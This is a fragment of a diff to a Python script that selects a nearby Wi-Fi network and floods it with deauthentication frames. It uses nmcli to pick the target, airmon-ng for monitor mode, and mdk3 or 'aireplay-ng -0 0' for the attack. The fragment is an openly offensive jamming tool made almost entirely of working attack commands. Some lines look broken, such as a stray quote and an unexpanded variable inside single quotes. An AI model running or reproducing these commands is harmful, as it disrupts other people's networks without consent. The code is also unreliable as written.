@@ -54,13 +54,13 @@ print("")
 
 if way == 1:
   os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SSID, dev wifi list ifname $card | awk '{print FS2 $7}' | sed '/$choose/p; d' > target")
-  os.system('card=`cat card.sh` && ch=`cat chan` && airmon-ng stop $card && airmon-ng start $card $ch')
+  os.system('card=`cat card.sh` && ch=`cat chan` && airmon-ng start $card $ch')
   os.system("card=`cat card.sh`mon && choose=`cat choose` && target=`cat target` && mdk3 $card d -n '$target'")
   print("Wait..")
   os.system('card=`cat card.sh`mon && ch=`cat chan` && airmon-ng stop $card')
 else:
   os.system("card=`cat card.sh` && choose=`cat choose` && nmcli -f NAME,BSSID,CHAN,RATE,SIGNAL,SECURITY,SSID, dev wifi list ifname $card | awk '{print FS2 $2}' | sed '/$choose/p; d' > target")
-  os.system('card=`cat card.sh` && ch=`cat chan` && airmon-ng stop $card && airmon-ng start $card $ch')
+  os.system('card=`cat card.sh` && ch=`cat chan` && airmon-ng start $card $ch')
   os.system("card=`cat card.sh`mon && choose=`cat choose` && target=`cat target` && aireplay-ng -0 0 -a $target $card'")
   print("Wait..")
   os.system('card=`cat card.sh`mon && ch=`cat chan` && airmon-ng stop $card')
